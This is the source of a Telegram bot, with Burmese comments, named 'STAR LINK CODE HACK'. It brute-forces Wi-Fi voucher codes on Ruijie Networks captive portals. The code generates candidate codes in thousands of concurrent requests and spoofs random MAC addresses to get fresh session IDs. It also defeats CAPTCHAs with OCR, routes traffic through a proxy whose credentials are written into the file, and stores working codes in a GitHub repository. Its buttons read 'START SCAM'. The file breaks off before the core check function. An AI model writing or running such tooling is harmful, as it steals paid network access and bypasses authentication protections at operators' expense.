import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ==================== CONFIGURATION ====================
# Railway Variables tab တွင် ထည့်ရမည်
BOT_TOKEN    = os.environ.get("BOT_TOKEN",    "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
REPO_OWNER   = os.environ.get("REPO_OWNER",   "")
REPO_NAME    = os.environ.get("REPO_NAME",    "")

# Admin Telegram IDs — ဤနေရာတွင် တိုက်ရိုက်ထည့်ပါ
ADMINS = [
    "1626617395",   # Admin 1 ID
    "7768424102",   # Admin 2 ID
]

# Startup validation
_missing = [k for k, v in {
    "BOT_TOKEN":    BOT_TOKEN,
    "GITHUB_TOKEN": GITHUB_TOKEN,
    "REPO_OWNER":   REPO_OWNER,
    "REPO_NAME":    REPO_NAME,
}.items() if not v]
if _missing:
    raise SystemExit(
        f"❌ Railway Variables tab တွင် အောက်ပါများ မထည့်ရသေးပါ:\n"
        + "\n".join(f"   • {k}" for k in _missing)
    )

def is_admin(user_id):
    return str(user_id) in ADMINS

PROXY_LIST = [
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
]

_proxy_index = 0
def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}"

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data        = {}
scan_tasks       = {}
success_messages = {}
success_texts    = {}
limited_messages = {}
limited_texts    = {}
captcha_state    = {}
session          = None
_connector       = None
CONCURRENCY      = 1000
_voucher_sem     = None
_start_time      = time.monotonic()

MAX_CONCURRENT_SCANS = 20
active_scans_count   = 0
active_scans_lock    = asyncio.Lock()

# ───────────────────────────────────────────────────────────
# Web server (keep-alive / Railway PORT)
# ───────────────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app    = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8099)))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ───────────────────────────────────────────────────────────
# GitHub helpers
# ───────────────────────────────────────────────────────────
async def get_file_content(path):
    url     = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data    = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url     = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {"message": message, "content": encoded, "sha": sha}
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# ───────────────────────────────────────────────────────────
# Keyboards
# ───────────────────────────────────────────────────────────
def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔗 Portal URL ထည့်ရန်",         callback_data="menu_free_trial"),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်",     callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်",    callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်",                callback_data="menu_stop"),
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး",            callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး",            callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး",            callback_data="scan_8"),
        InlineKeyboardButton("🔢 VOUCHER 9 လုံး",            callback_data="scan_9"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower",        callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower 9လုံး", callback_data="scan_ascii-lower9"),
        InlineKeyboardButton("🎲 VOUCHER all",                callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး",            callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး",            callback_data="scan_mixed8"),
        InlineKeyboardButton("🔤+🔢 MIXED 9လုံး",            callback_data="scan_mixed9"),
        InlineKeyboardButton("🔙 Back",                       callback_data="menu_back"),
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons  = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back",   callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back",        callback_data="menu_back"),
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back",       callback_data="menu_back"),
    )
    return keyboard

# ───────────────────────────────────────────────────────────
# /start
# ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}

    user_name = message.from_user.first_name or message.from_user.username or "User"
    user_id   = str(message.chat.id)

    welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

🎉 မင်္ဂလာပါ!
အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""

    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard())

# ───────────────────────────────────────────────────────────
# Callback handler
# ───────────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id   = call.message.chat.id
    user_id   = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"

    # ── Back ──────────────────────────────────────────────
    if call.data == "menu_back":
        text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=text, reply_markup=get_main_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    # ── Portal URL instructions ────────────────────────────
    if call.data == "menu_free_trial":
        text = """🔗 Portal URL ထည့်သွင်းရန်:

/portal [your_portal_url]

ဥပမာ:
/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00

Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်ဖြစ်သည်။"""
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=text, reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    # ── Start scan ────────────────────────────────────────
    if call.data == "menu_start_scam":
        global active_scans_count, active_scans_lock
        async with active_scans_lock:
            if active_scans_count >= MAX_CONCURRENT_SCANS:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=call.message.message_id,
                    text=f"⚠️ Bot အလုပ်များနေပါသည်။ {active_scans_count}/{MAX_CONCURRENT_SCANS} ယောက် scan လုပ်နေပါသည်။\n\nခဏစောင့်ပြီးမှ ထပ်ကြိုးစားပါ။",
                    reply_markup=get_back_keyboard()
                )
                await bot.answer_callback_query(call.id)
                return
            active_scans_count += 1

        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text="❌ VOUCHER အမျိုးအစားမရွေးရသေးပါ။ VOUCHER အရင်ရွေးပါ။",
                reply_markup=get_voucher_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return

        mode        = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')

        if 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return

        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text="Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
                reply_markup=get_scam_button_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return

        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}\n\nSTOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
            reply_markup=get_scam_button_keyboard(), parse_mode="Markdown"
        )

        progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
        scan_id      = str(uuid.uuid4())

        # Notify admins (scan start)
        try:
            portal_url = user_data[chat_id].get('session_url', 'Unknown')
            last_url   = user_data[chat_id].get('last_admin_notified_url', '')
            if portal_url != last_url and portal_url != 'Unknown':
                msg = (f"🚀 **Scan Start**\n\n👤 **User:** {user_name}\n"
                       f"🆔 **ID:** `{user_id}`\n🔢 **Mode:** {mode}\n"
                       f"🔗 **Portal:**\n`{portal_url}`")
                for admin_id in ADMINS:
                    try:
                        await bot.send_message(admin_id, msg, parse_mode="Markdown")
                    except Exception:
                        pass
                user_data[chat_id]['last_admin_notified_url'] = portal_url
        except Exception as e:
            print(f"Admin notify error: {e}")

        task = asyncio.create_task(
            run_bruteforce(
                mode, chat_id, user_data[chat_id]['session_url'],
                scan_id, message=call.message,
                progress_msg=progress_msg, start_digit=start_digit
            )
        )
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await bot.answer_callback_query(call.id)
        return

    # ── Results ───────────────────────────────────────────
    if call.data == "menu_result":
        results, _ = await get_file_content("result.json")
        if user_id in results and results[user_id]:
            codes = "\n".join(results[user_id])
            text  = f"✅ Found Codes:\n{codes}"
        else:
            text = "📋 ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=text, reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    # ── Recheck ───────────────────────────────────────────
    if call.data == "menu_recheck":
        if 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="🔄 Recheck ကို စတင်နေပါသည်...",
            reply_markup=get_scam_button_keyboard()
        )
        await recheck(call.message)
        await bot.answer_callback_query(call.id)
        return

    # ── Stop ─────────────────────────────────────────────
    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return

    # ── Select voucher mode ───────────────────────────────
    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")

        if chat_id not in user_data:
            user_data[chat_id] = {}

        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return

        if mode in ["6", "7", "8", "9"]:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=call.message.message_id,
                text=f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -",
                reply_markup=get_digit_keyboard(mode)
            )
            await bot.answer_callback_query(call.id)
            return

        user_data[chat_id]['selected_mode']  = mode
        user_data[chat_id]['start_digit']    = None

        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=f"🔍 ရွေးချယ်ထားသော VOUCHER: {mode}\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
            reply_markup=get_start_scam_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    # ── Select start digit ────────────────────────────────
    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode  = parts[1]
        digit = parts[2]

        if chat_id not in user_data:
            user_data[chat_id] = {}

        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit']   = None if digit == "random" else digit

        txt = f"🔍 VOUCHER Mode: {mode}\n"
        txt += "🔢 ထိပ်စီးနံပါတ်: Random" if digit == "random" else f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"

        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=txt + "\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
            reply_markup=get_start_scam_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

# ───────────────────────────────────────────────────────────
# /result
# ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['result'])
async def handle_result(message):
    results, _ = await get_file_content("result.json")
    uid         = str(message.chat.id)
    if uid in results and results[uid]:
        codes = "\n".join(results[uid])
        await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
    else:
        await bot.reply_to(message, "ယခင်ကရရှိထားသော code မရှိသေးပါ။")

# ───────────────────────────────────────────────────────────
# /recheck
# ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id

    results, sha = await get_file_content("result.json")
    uid          = str(chat_id)

    if uid not in results or not results[uid]:
        await bot.reply_to(message, "ယခင် success code တစ်ခုမျှမရှိသေးပါ။")
        return

    if 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return

    await bot.reply_to(message, "Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")

    recheck_list    = []
    session_url_rc  = user_data[chat_id]["session_url"]
    for code in results[uid]:
        recode = await perform_check(
            session_url_rc, code, chat_id,
            scan_id=None, recheck=True, message=message
        )
        if recode:
            recheck_list.append(recode)

    to_show = "\n".join(recheck_list) if recheck_list else "မည်သည့် success code မျှမကျန်ပါ။"
    await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
    await save_rechecked_codes(uid, recheck_list, sha)

async def save_rechecked_codes(uid, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[uid] = recheck_list
    await update_file_content("result.json", results, sha, f"Recheck update for {uid}")

# ───────────────────────────────────────────────────────────
# /portal
# ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]\n\n"
            "ဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/"
            "maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00"
        )
        return

    url = args[1]
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}

    await bot.reply_to(message, "🔗 Portal URL စစ်ဆေးနေပါသည်...")

    if await check_session_url_improved(session_url=url):
        user_data[message.chat.id]['session_url'] = url
        await bot.reply_to(
            message,
            "✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
            reply_markup=get_voucher_keyboard()
        )
    else:
        await bot.reply_to(
            message,
            "❌ Portal URL မှားယွင်းနေပါသည်။ ပြန်လည်စစ်ဆေးပါ။\n\n"
            "✅ မှန်ကန်တဲ့ URL ပုံစံ:\n"
            "`https://portal-as.ruijienetworks.com/download/static/maccauth/"
            "src/index.html?lang=en_US&mac=02:00:00:00:00:00`",
            parse_mode="Markdown"
        )

async def check_session_url_improved(session_url, use_proxy=False):
    headers = {
        'accept':          'text/html,application/xhtml+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    proxy = get_next_proxy() if use_proxy else None
    try:
        async with session.get(
            session_url, allow_redirects=True, headers=headers,
            proxy=proxy, timeout=15
        ) as response:
            if response.status >= 400:
                return False
            final_url     = str(response.url)
            response_text = await response.text()
            if "sessionId" in final_url or "sessionId" in response_text:
                return True
            for indicator in ["portal-as.ruijienetworks.com", "maccauth", "sessionId", "lang=en_US"]:
                if indicator in final_url or indicator in response_text:
                    return True
            for pattern in [
                r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)',
                r'[?&]sessionId=([a-zA-Z0-9]+)',
            ]:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
            if "portal" in response_text.lower() or "captcha" in response_text.lower():
                return True
            return False
    except asyncio.TimeoutError:
        return False
    except Exception as e:
        print(f"Portal check error: {e}")
        return False

# ───────────────────────────────────────────────────────────
# /scan  (command-based entry)
# ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['scan'])
async def handle_key_scan(message):
    args    = message.text.split(maxsplit=1)
    chat_id = message.chat.id
    user_id = str(chat_id)

    if len(args) < 2:
        await bot.reply_to(
            message,
            "VOUCHER ရွေးချယ်ရန်:\n\n"
            "/scan 6, 7, 8, 9, ascii-lower, ascii-lower9, all, mixed, mixed8, mixed9",
            reply_markup=get_voucher_keyboard()
        )
        return

    mode = args[1]
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။")
        return

    progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
    scan_id      = str(uuid.uuid4())

    try:
        user_name  = message.from_user.first_name or message.from_user.username or "User"
        portal_url = user_data[chat_id].get('session_url', 'Unknown')
        last_url   = user_data[chat_id].get('last_admin_notified_url', '')
        if portal_url != last_url and portal_url != 'Unknown':
            msg = (f"🚀 **Scan (/scan)**\n👤 **User:** {user_name}\n"
                   f"🆔 **ID:** `{user_id}`\n🔢 **Mode:** {mode}\n"
                   f"🔗 **Portal:**\n`{portal_url}`")
            for admin_id in ADMINS:
                try:
                    await bot.send_message(admin_id, msg, parse_mode="Markdown")
                except Exception:
                    pass
            user_data[chat_id]['last_admin_notified_url'] = portal_url
    except Exception as e:
        print(f"Admin notify error in /scan: {e}")

    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'],
                       scan_id, message=message, progress_msg=progress_msg)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

# ───────────────────────────────────────────────────────────
# /status  (admin only)
# ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['status'])
async def status(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    active_scans   = sum(1 for d in scan_tasks.values() if not d["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, rem     = divmod(uptime_seconds, 3600)
    minutes, secs  = divmod(rem, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {secs}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"👥 Sessions: {len(user_data)}"
    )

# ───────────────────────────────────────────────────────────
# /stop
# ───────────────────────────────────────────────────────────
async def send_success_file(chat_id):
    target_ids = ["6988969946", "1981253384", "1477223103"]
    if str(chat_id) in target_ids and chat_id in success_texts and success_texts[chat_id]:
        try:
            filename = f"success_{chat_id}_{int(time.time())}.txt"
            content  = "\n".join(success_texts[chat_id])
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
            with open(filename, "rb") as f:
                await bot.send_document(
                    chat_id, f,
                    caption="✅ Scan ရပ်တန့်သောကြောင့် Success Codes ဖိုင်ပို့ပေးလိုက်ပါသည်။"
                )
            if os.path.exists(filename):
                os.remove(filename)
        except Exception as e:
            print(f"send_success_file error: {e}")

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data    = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"]     = True
        data["scan_id"]  = None
        await send_success_file(chat_id)
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())

# ───────────────────────────────────────────────────────────
# GitHub result scheduler
# ───────────────────────────────────────────────────────────
async def github_update_scheduler():
    while True:
        await asyncio.sleep(180)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    uid  = str(item["chat_id"])
                    code = item["code"]
                    if uid not in results:
                        results[uid] = []
                    if code not in results[uid]:
                        results[uid].append(code)
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                print(f"GitHub update error: {e}")

# ───────────────────────────────────────────────────────────
# Code generators
# ───────────────────────────────────────────────────────────
def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def all_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def mixed_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end   = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        if mode in ["6", "7", "8"]:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "9":
            while True:
                yield digit_generator(9)
    elif mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    elif mode == "ascii-lower9":
        while True:
            yield ascii_generator(9)
    elif mode == "all":
        while True:
            yield all_generator(6)
    elif mode == "mixed":
        while True:
            yield mixed_generator(6)
    elif mode == "mixed8":
        while True:
            yield mixed_generator(8)
    elif mode == "mixed9":
        while True:
            yield mixed_generator(9)
    else:
        raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent    = (checked / total) * 100
        filled     = min(bar_length, int(percent / 5))
        bar        = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍Scanning VOUCHER Codes...\n\n"
            f"📦Checked : {checked:,}/{total:,}\n"
            f"📊Progress : {percent:.2f}%\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Success code hit : {found}\n"
            f"[{bar}]"
        )
    return (
        f"🔍Scanning VOUCHER Codes...\n\n"
        f"📦Checked : {checked:,}\n"
        f"⚡Speed : {speed_str}\n"
        f"✅Success code hit : {found}\n"
        f"📊Status : running\n"
    )

BATCH_SIZE = 1000

# ───────────────────────────────────────────────────────────
# Brute-force runner
# ───────────────────────────────────────────────────────────
async def run_bruteforce(mode, chat_id, session_url, scan_id,
                         message=None, progress_msg=None, start_digit=None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = (10 ** int(mode)) if mode in ["6", "7", "8"] else None

    checked    = 0
    scan_start = time.monotonic()

    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)

            found   = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed   = (checked / elapsed * 60) if elapsed > 0 else 0
            text    = format_progress(checked, total, speed, found)

            try:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=progress_msg.message_id, text=text
                )
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress error: {err}")

        # Completed
        found       = len(success_texts.get(chat_id, []))
        finish_text = (
            f"🔍Scanning Completed\n\n"
            f"📦Checked : {checked:,}" + (f"/{total:,}" if total else "") +
            f"\n✅ Success code hit: {found}\n📊Progress : 100%\n[██████████████████]"
        )
        try:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text
            )
        except Exception:
            await bot.send_message(chat_id, finish_text)

        await send_success_file(chat_id)

    finally:
        await send_success_file(chat_id)
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        global active_scans_count, active_scans_lock
        async with active_scans_lock:
            active_scans_count = max(0, active_scans_count - 1)

# ───────────────────────────────────────────────────────────
# Session / Captcha helpers
# ───────────────────────────────────────────────────────────
def get_mac():
    fb  = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [fb] + [random.randint(0x00, 0xFF) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(sess, session_url, previous_session_id=None):
    mac        = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept':       'text/html,application/xhtml+xml,*/*;q=0.8',
        'user-agent':   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'cookie':       ('sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-'
                         '0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'),
    }
    try:
        async with sess.get(session_url, headers=headers, allow_redirects=True) as req:
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return m.group(1) if m else previous_session_id
    except Exception:
        return previous_session_id

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray  = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur  = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, bf = cv2.imencode('.png', th)
    return _ocr.classification(bf.tobytes()).upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(sess, session_id):
    headers = {
        'authority':    'portal-as.ruijienetworks.com',
        'accept':       'image/*,*/*;q=0.8',
        'user-agent':   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params=params, headers=headers
    ) as req:
        return await req.read()

async def Varify_Captcha(sess, session_id, text):
    headers = {
        'authority':    'portal-as.ruijienetworks.com',
        'accept':       '*/*',
        'content-type': 'application/json',
        'origin':       'https://portal-as.ruijienetworks.com',
        'user-agent':   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    }
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=headers,
        json={'sessionId': session_id, 'authCode': text}
    ) as req:
        data = await req.json()
        print(f"[Captcha] authCode={text} success={data.get('success')}")
        return session_id if data.get("success") else None

# ───────────────────────────────────────────────────────────
# Core voucher check
